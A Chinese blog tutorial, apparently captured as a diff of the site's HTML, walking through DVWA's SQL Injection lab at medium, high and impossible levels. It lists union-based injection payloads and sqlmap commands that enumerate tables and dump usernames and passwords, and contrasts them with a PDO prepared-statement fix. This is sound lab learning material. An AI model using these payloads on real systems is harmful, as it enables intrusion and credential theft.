+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115205247.png" alt=""></p>
+<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># medium.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">        $id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],$id);</span><br><span class="line">        $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>( $row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="comment">// Display values</span></span><br><span class="line">            $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">            $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID:&#123;$id&#125;&lt;br/&gt;First name:&#123;$first&#125;&lt;br/&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// This is used later on in the index.php page</span></span><br><span class="line">    <span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">    $query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>]))?mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]):(($___mysqli_res=mysqli_connect_error())?$___mysqli_res:<span class="keyword">false</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    $number_of_rows = mysqli_fetch_row($result)[<span class="number">0</span>];</span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：改用POST方式提交，对id进行了mysqli_real_escape_string()函数过滤，但SQL语句存在数字型注入；</p>
+<p>mysqli_real_escape_string()函数语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">connection</td>
+<td style="text-align:left">必需，规定要使用的 MySQL 连接。</td>
+</tr>
+<tr>
+<td style="text-align:left">escapestring</td>
+<td style="text-align:left">必需，要转义的字符串。编码的字符是NULL(ASCII 0)、\n、\r、\、’、” 和 Control-Z。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断-2"><a href="#注入判断-2" class="headerlink" title="注入判断"></a>注入判断</h3><p>POST方式传递，采用抓包更改参数；</p>
+<ol>
+<li><p>抓包更改id为<code>1&#39; and &#39;1&#39;=&#39;1</code>，报错，显示字符被转义，不是字符型注入；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115211926.png" alt=""></p>
+</li>
+<li><p>抓包更改id为<code>1 and 1=2</code>，无回显；</p>
+</li>
+<li><p>抓包更改id为<code>1 and 1=1</code>，有回显如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212532.png" alt=""></p>
+</li>
+<li><p>抓包更改id为<code>1 or 1=1</code>，有回显如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212630.png" alt=""></p>
+</li>
+</ol>
+<p>根据上述发现猜测存在<strong>数字型注入</strong>。</p>
+<h3 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h3><p>使用<code>order by</code>猜测SQL查询语句中的字段数，为union查询做准备</p>
+<ol>
+<li><p>更改id为<code>1 or 1=1 order by 1 #</code>，查询成功；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212909.png" alt=""></p>
+</li>
+<li><p>更改id为<code>1 or 1=1 order by 2 #</code>，查询成功；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213015.png" alt=""></p>
+</li>
+<li><p>更改id为<code>1 or 1=1 order by 3 #</code>，查询失败；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213055.png" alt=""></p>
+</li>
+</ol>
+<p>说明查询语句中存在2个字段，即First name和Surname；</p>
+<h3 id="确定显示字段顺序-1"><a href="#确定显示字段顺序-1" class="headerlink" title="确定显示字段顺序"></a>确定显示字段顺序</h3><p>更改id为<code>1 union select 1,2 #</code>，查询成功，两个字段显示如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213329.png" alt=""></p>
+<h3 id="获取当前数据库和用户名-1"><a href="#获取当前数据库和用户名-1" class="headerlink" title="获取当前数据库和用户名"></a>获取当前数据库和用户名</h3><p>更改id为<code>1 union select database(),user() #</code>，查询成功，数据库为dvwa，用户为dvwa；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213543.png" alt=""></p>
+<h3 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p>更改id为<code>1 union select TABLE_NAME,2 form information_schema.TABLES where TABLE_SCHEMA=database() #</code>，查询成功，获取表如下；(此处的数据库名称也可为十六进制)</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115214838.png" alt=""></p>
+<h3 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><p>更改id为<code>1 union select COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=0x7573657273 #</code>，获取字段如下user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215648.png" alt=""></p>
+<h3 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a>下载数据</h3><p>更改id为<code>1 union select user,password from users #</code>，获取users表中的所有用户和密码；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215916.png" alt=""></p>
+<h2 id="SQLmap注入-1"><a href="#SQLmap注入-1" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><p>SQLmap进行POST注入过程如下：</p>
+<h3 id="截获数据包"><a href="#截获数据包" class="headerlink" title="截获数据包"></a>截获数据包</h3><p>将截获的数据包复制到文件data.txt中</p>
+<p><img src="/Users/leeyuxun/Library/Application Support/typora-user-images/image-20201115223004551.png" alt="image-20201115223004551"></p>
+<h3 id="注入判断-3"><a href="#注入判断-3" class="headerlink" title="注入判断"></a>注入判断</h3><p>输入<code>sqlmap -r data.txt -p id</code>，发现存在SQL注入点id(POST),数据库类型为mysql；-r表示读取文件，-p表示注入参数；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223436.png" alt=""></p>
+<h3 id="爆破数据库-1"><a href="#爆破数据库-1" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p>输入<code>sqlmap -r data.txt -p id -dbs</code>，获取数据库；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223610.png" alt=""></p>
+<h3 id="爆破数据表-1"><a href="#爆破数据表-1" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p>选择dvwa数据库，输入<code>sqlmap -r data.txt -p id -D dvwa --tables</code>，获取dvwa数据库的数据表；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223751.png" alt=""></p>
+<h3 id="爆破字段-1"><a href="#爆破字段-1" class="headerlink" title="爆破字段"></a>爆破字段</h3><p>选择users数据表，输入<code>sqlmap -r data.txt -p id -D dvwa -T users --columns</code>，获取users表的字段；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223931.png" alt=""></p>
+<h3 id="爆破字段内容-1"><a href="#爆破字段内容-1" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h3><p>输入<code>sqlmap -r data.txt -p id -D dvwa -T users -C user,password --dump</code>，爆破user和password字段内容；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115224153.png" alt=""></p>
+<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#high.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">            $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：加了<code>limit 1</code>限制输出，但是可以直接使用<code>#</code>注释掉，解法与<code>Low Security Level</code>相同。</p>
+<p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；</p>
+<p>但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：<code>--second-url=&quot;xxxurl&quot;</code>（设置二阶响应的结果显示页面的url）</p>
+<p>输入<code>sqlmap -r data.txt -p id --second-url=&quot;http://localhost/dvwa/vulnerabilities/sqli/index.php&quot;</code>检测是否存在SQL注入，结果如下，存在注入点，后续操作与MEDIUM注入相同；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116113840.png" alt=""></p>
+<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        checkToken($_REQUEST[<span class="string">'user_token'</span>],$_SESSION[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Was a number entered?</span></span><br><span class="line">        <span class="keyword">if</span>(is_numeric($id))&#123;</span><br><span class="line">            <span class="comment">// Check the database</span></span><br><span class="line">            $data = $db-&gt;prepare(<span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span>);</span><br><span class="line">            $data-&gt;bindParam(<span class="string">':id'</span>,$id,PDO::PARAM_INT);</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line">            $row = $data-&gt;fetch();</span><br><span class="line">            <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">            <span class="keyword">if</span>($data-&gt;rowCount()==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                $first = $row[<span class="string">'first_name'</span>];</span><br><span class="line">                $last  = $row[<span class="string">'last_name'</span>];</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br/&gt;First name: &#123;$first&#125;&lt;br/&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了SQL注入攻击，<code>Anti-CSRFtoken</code> 机制的加入了进一步提高了安全性。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <link href="css/font-awesome.min.css?v=4.7.0" rel="stylesheet">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <p><span>本文标题: </span><a href="/DVWA-SQL-Injection.html">DVWA SQL Injection</a></p>
+  <p><span>文章作者: </span><a href="/" title="访问 李钰璕 的个人博客">李钰璕</a></p>
+  <p><span>发布时间: </span>2019年11月15日 - 16:30</p>
+  <p><span>最后更新: </span>2020年11月16日 - 22:16</p>
+  <p><span>原始链接: </span><a href="/DVWA-SQL-Injection.html" title="DVWA SQL Injection"><a href="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html" title="DVWA SQL Injection">https://www.leeyuxun.github.io/DVWA-SQL-Injection.html</a></a></p>
+  <p><span>许可协议: </span>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"> <i class="fab fa-creative-commons"></i>BY-NC-SA </a>许可协议，转载请注明出处！</p>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
+              <a href="/tags/SQLmap/" rel="tag"><i class="fa fa-tag"></i> SQLmap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%BA%8C.html" rel="prev" title="漏洞分析技术实验二">
+      <i class="fa fa-chevron-left"></i> 漏洞分析技术实验二
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/DVWA-SQL-Injection-Blind.html" rel="next" title="DVWA SQL Injection (Blind)">
+      DVWA SQL Injection (Blind) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
     let { activeClass } = CONFIG.comments;
     if (CONFIG.comments.storage) {
       activeClass = localStorage.getItem('comments_active') || activeClass;
@@ -16,7 +518,169 @@
       let commentClass = event.target.classList[1];
       localStorage.setItem('comments_active', commentClass);
     });
-  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LOW"><span class="nav-number">2.</span> <span class="nav-text">LOW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源代码"><span class="nav-number">2.1.</span> <span class="nav-text">源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手动注入"><span class="nav-number">2.2.</span> <span class="nav-text">手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断"><span class="nav-number">2.2.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜解SQL查询语句中的字段数"><span class="nav-number">2.2.2.</span> <span class="nav-text">猜解SQL查询语句中的字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定显示字段顺序"><span class="nav-number">2.2.3.</span> <span class="nav-text">确定显示字段顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前数据库和用户名"><span class="nav-number">2.2.4.</span> <span class="nav-text">获取当前数据库和用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库中的表"><span class="nav-number">2.2.5.</span> <span class="nav-text">获取数据库中的表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表中的字段名"><span class="nav-number">2.2.6.</span> <span class="nav-text">获取表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载数据"><span class="nav-number">2.2.7.</span> <span class="nav-text">下载数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap注入"><span class="nav-number">2.3.</span> <span class="nav-text">SQLmap注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据库"><span class="nav-number">2.3.2.</span> <span class="nav-text">爆破数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据表"><span class="nav-number">2.3.3.</span> <span class="nav-text">爆破数据表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段"><span class="nav-number">2.3.4.</span> <span class="nav-text">爆破字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段内容"><span class="nav-number">2.3.5.</span> <span class="nav-text">爆破字段内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MEDIUM"><span class="nav-number">3.</span> <span class="nav-text">MEDIUM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源代码-1"><span class="nav-number">3.1.</span> <span class="nav-text">源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手动注入-1"><span class="nav-number">3.2.</span> <span class="nav-text">手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断-2"><span class="nav-number">3.2.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜解SQL查询语句中的字段数-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">猜解SQL查询语句中的字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定显示字段顺序-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">确定显示字段顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前数据库和用户名-1"><span class="nav-number">3.2.4.</span> <span class="nav-text">获取当前数据库和用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库中的表-1"><span class="nav-number">3.2.5.</span> <span class="nav-text">获取数据库中的表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表中的字段名-1"><span class="nav-number">3.2.6.</span> <span class="nav-text">获取表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载数据-1"><span class="nav-number">3.2.7.</span> <span class="nav-text">下载数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap注入-1"><span class="nav-number">3.3.</span> <span class="nav-text">SQLmap注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#截获数据包"><span class="nav-number">3.3.1.</span> <span class="nav-text">截获数据包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断-3"><span class="nav-number">3.3.2.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据库-1"><span class="nav-number">3.3.3.</span> <span class="nav-text">爆破数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据表-1"><span class="nav-number">3.3.4.</span> <span class="nav-text">爆破数据表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段-1"><span class="nav-number">3.3.5.</span> <span class="nav-text">爆破字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段内容-1"><span class="nav-number">3.3.6.</span> <span class="nav-text">爆破字段内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HIGH"><span class="nav-number">4.</span> <span class="nav-text">HIGH</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源代码-2"><span class="nav-number">4.1.</span> <span class="nav-text">源代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IMPOSSIBLE"><span class="nav-number">5.</span> <span class="nav-text">IMPOSSIBLE</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="李钰璕" src="/images/avatar.png"><p class="site-author-name" itemprop="name">李钰璕</p><div class="site-description" itemprop="description">从0开始学习网络安全</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">75</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">105</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a> </span><span class="links-of-author-item"><a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>if (typeof MathJax === 'undefined') {
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LOW"><span class="nav-number">2.</span> <span class="nav-text">LOW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源代码"><span class="nav-number">2.1.</span> <span class="nav-text">源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手动注入"><span class="nav-number">2.2.</span> <span class="nav-text">手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断"><span class="nav-number">2.2.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜解SQL查询语句中的字段数"><span class="nav-number">2.2.2.</span> <span class="nav-text">猜解SQL查询语句中的字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定显示字段顺序"><span class="nav-number">2.2.3.</span> <span class="nav-text">确定显示字段顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前数据库和用户名"><span class="nav-number">2.2.4.</span> <span class="nav-text">获取当前数据库和用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库中的表"><span class="nav-number">2.2.5.</span> <span class="nav-text">获取数据库中的表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表中的字段名"><span class="nav-number">2.2.6.</span> <span class="nav-text">获取表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载数据"><span class="nav-number">2.2.7.</span> <span class="nav-text">下载数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap注入"><span class="nav-number">2.3.</span> <span class="nav-text">SQLmap注入</span></a><ol class="nav-child"><li class="nav-item 